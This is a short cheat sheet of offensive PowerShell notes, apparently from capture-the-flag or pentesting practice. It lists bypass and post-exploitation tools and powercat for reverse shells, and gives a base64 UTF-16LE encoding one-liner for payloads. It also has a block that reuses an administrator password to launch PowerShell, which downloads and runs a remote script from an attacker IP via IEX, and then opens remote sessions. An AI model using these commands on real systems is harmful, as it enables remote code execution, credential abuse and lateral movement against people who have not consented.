# powershell

bypass tool 

github.com/trustedsec/unicorn



framework   nishang   powersploit

reverse shell powercat



avoid any possible quotation and encoding issues

little endian UTF-16 encoding version.

```
iconv -f ASCII -t UTF-16LE powershell.txt | base64 | tr -d "\n"
```

hash

`get-filehash`

```
password reuse

$passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('administrator',$passwd) 
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.17.114/1.ps1')" -Credential $creds
or
new-pssession -computername . -credential $cred  // enter-pssession -computer arkham -credential $cred
enter-pssession 1
```
